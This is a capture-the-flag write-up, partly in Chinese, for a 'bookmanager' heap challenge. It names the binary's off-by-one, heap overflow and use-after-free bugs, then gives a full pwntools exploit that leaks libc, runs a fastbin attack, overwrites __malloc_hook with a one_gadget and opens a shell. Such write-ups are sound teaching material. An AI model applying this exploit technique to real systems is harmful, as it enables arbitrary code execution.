[TOC]

# checksec
![image](4DD9B3C2AE354B2BBFDFFE8744DA53D6)

# 程序逻辑
1. add a chap   offbyone
2. add a sec    off by one 泄露堆地址
3. add text     存在堆溢出
4. remove chap 
5. rm sec   uaf
6. rm text
7. preview
8. update
9. exit

通过offbyone 泄露处libc ，通过堆溢出 fast bin attack

exp
```
from pwn import *

def bookname(data):
	p.recv()
	p.send(data)
	p.recv()

def addchap(data):
	p.sendline("1")
	p.recv()
	p.send(data)
	p.recv()

def addsec(name, data):
	p.sendline("2")
	p.recv()
	p.send(name)
	p.recvuntil("0x0x")
	result =int(p.recvuntil("\n"),16)
	p.recv()
	p.send(data)
	p.recv()
	return result

def addtext(name,size,data):
	p.sendline("3")
	p.recv()
	p.send(name)
	p.recv()
	p.sendline(str(size))
	p.recv()
	p.send(data)
	p.recv()

def rmchap(name):
	p.sendline("4")
	p.recv()
	p.sendline(name)
	p.recv()

def rmsec(name):
	p.sendline("5")
	p.recv()
	p.send(name)
	p.recv()

def rmtext(name):
	p.sendline("6")
	p.recv()
	p.send(name)
	p.recv()

def update(tp,name,new):
	p.sendline("8")
	p.recv()
	p.sendline(tp)
	p.recv()
	p.sendline(name)
	p.recv()
	p.send(new)
	p.recv()

def show():
	p.sendline("7")
	p.recv()


p = process('./bookmanager')
bookname("mcl")
addchap("mcl")
pointer=addsec("mcl","mclsection1")
addtext("mclsection1",0xe8,"leak")
pointer2=addsec("mcl","mclsection2")
pointer3 = addsec("mcl","mclsection3")
leak= pointer+0x40
rmtext("mclsection1")
malloc_hook_near = "\x00"
addtext("mclsection3",0x60,malloc_hook_near)


p.sendline("7")
leak_addr = u64(p.recvuntil("\x0a\x3d")[-8:-2].ljust(8,'\x00'))
#gdb.attach(p)
p.recv()
malloc_hook_near_addr = leak_addr - 0x7ffff7dd1c58 + 0x7ffff7dd1aed 
libc_addr = leak_addr - 0x7ffff7dd1c58 + 0x00007ffff7a0d000

pointer4 = addsec("mcl","sec4")
pointer5 = addsec("mcl","sec5")
pointer6 = addsec("mcl","sec6")



addtext("sec4",0x60,"sec4")
addtext("sec5",0x60,"sec5")
addtext("sec6",0x60,p64(malloc_hook_near_addr))



#fastbin attack
sec4addr = pointer4 + 0x40+0x40-0x10 + 0xc0
padding = p64(malloc_hook_near_addr) + p64(0)*12 + p64(0x71) + p64(sec4addr) +p64(0)*12+p64(0x71)

rmtext("sec5")
update("Text","sec4",padding)
addtext("sec5",0x60,"1")
addtext("sec5",0x60,"2")
padding = "\x00"*11+p64(libc_addr + 0x4526a)+p64(libc_addr + 0x846c0)
gdb.attach(p)
addtext("sec5",0x60,"atack")
update("Text","sec5",padding)
p.sendline("1")
p.interactive()




```
